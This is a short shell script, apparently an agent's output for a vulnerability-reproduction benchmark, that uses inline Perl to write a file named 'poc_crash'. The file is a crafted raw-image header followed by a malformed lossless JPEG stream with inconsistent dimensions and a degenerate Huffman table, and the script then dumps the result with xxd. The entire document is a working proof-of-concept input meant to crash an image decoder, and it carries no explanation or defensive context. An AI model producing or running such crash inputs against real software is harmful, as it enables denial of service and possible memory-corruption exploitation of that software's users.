set -eu
out=/CybinGym_workdir/poc_crash
perl -e '
  use strict;
  my ($raw_w,$raw_h,$jpg_w,$jpg_h)=(1000,1,1000,1);
  print pack("V8",$raw_w,$raw_h,0,3,0,0,0,0);
  print "\xff\xd8";
  print "\xff\xc4", pack("n",20), "\x00", "\x01", ("\x00" x 15), "\x00";
  print "\xff\xc3", pack("n",20), "\x08", pack("nnC",$jpg_h,$jpg_w,4);
  for my $id (1..4) { print pack("CCC",$id,0x11,0); }
  print "\xff\xda", pack("n",14), "\x04";
  for my $id (1..4) { print pack("CC",$id,0); }
  print "\x01\x00\x00";
  print "\x00" x int(($jpg_w*$jpg_h*4+7)/8 + 32);
  print "\xff\xd9";
' > "$out"
file "$out"
stat -c 'path=%n size=%s' "$out"
xxd -g1 -l 128 "$out"
